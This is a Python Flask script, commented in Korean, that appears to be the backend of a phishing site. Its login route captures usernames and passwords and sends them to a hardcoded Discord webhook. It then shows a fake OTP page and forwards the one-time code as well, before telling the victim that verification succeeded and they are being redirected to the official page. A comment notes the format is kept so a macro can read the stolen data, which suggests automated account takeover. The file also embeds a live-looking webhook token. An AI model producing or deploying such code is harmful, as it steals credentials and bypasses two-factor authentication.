from flask import Flask, render_template, request, session
import requests

app = Flask(__name__)
app.secret_key = "secret_key_123"

# 실제 본인의 디스코드 웹훅 주소
WEBHOOK_URL = "https://discord.com/api/webhooks/1466648989309997117/2Ah53vvh-hW2S1bZEdLF1i5Qs0YEa1Fmd1_ZXUHjDFk1wRLCLQAADGLpR2HipxuoXWEC"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    uid = request.form.get('username')
    pw = request.form.get('password')
    session['uid'] = uid
    
    # 매크로가 읽기 쉬운 백틱(`) 포맷 유지
    data = {"content": f"🚨 **신규 로그인 정보**\nID: `{uid}`\nPW: `{pw}`"}
    requests.post(WEBHOOK_URL, json=data)
    
    return render_template('otp.html')

@app.route('/verify', methods=['POST'])
def verify():
    otp = request.form.get('otp_code')
    uid = session.get('uid', '알수없음')
    data = {"content": f"🔑 **OTP 코드 수신**\nID: `{uid}`\nOTP: **{otp}**"}
    requests.post(WEBHOOK_URL, json=data)
    return "인증이 완료되었습니다. 공식 페이지로 이동합니다."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
